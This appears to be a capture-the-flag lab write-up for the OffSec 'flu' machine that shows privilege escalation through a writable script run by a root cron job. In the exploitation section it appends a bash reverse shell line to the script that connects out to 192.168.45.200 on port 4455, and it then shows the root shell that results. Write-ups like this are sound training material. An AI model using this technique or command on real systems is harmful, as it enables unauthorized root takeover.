## Vector

**Writable script executed by a root cron job** (cronjob / script-hijack privesc).

## Enumeration

Checking the writable files and the cron attack surface as `confluence`:

```bash
ls -la /opt/log-backup.sh
```

```
-rwxr-xr-x 1 confluence confluence 408 Dec 12  2023 /opt/log-backup.sh
```

Key findings:

- `/opt/log-backup.sh` is **owned by `confluence`** and **group-writable/owner-writable** by us.
- `cron` daemon is running (`/usr/sbin/cron -f -P`).
- The root crontab (`/var/spool/cron/crontabs/root`) is not readable, but a **root cron job runs `/opt/log-backup.sh`** — the classic OffSec `flu` intended path.

Script contents:

```bash
#!/bin/bash
CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")
cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP
tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP
find $BACKUP_DIR -name "log_backup_*" -mmin +5 -exec rm -rf {} \;
```

## Exploitation

Appended a reverse shell to the script:

```bash
echo 'bash -i >& /dev/tcp/192.168.45.200/4455 0>&1' >> /opt/log-backup.sh
```

Started a catcher on `4455`, then waited for the next cron interval.

```
connection from 192.168.214.41:55568
root@flu:~#
```

Shell as **`root`**.
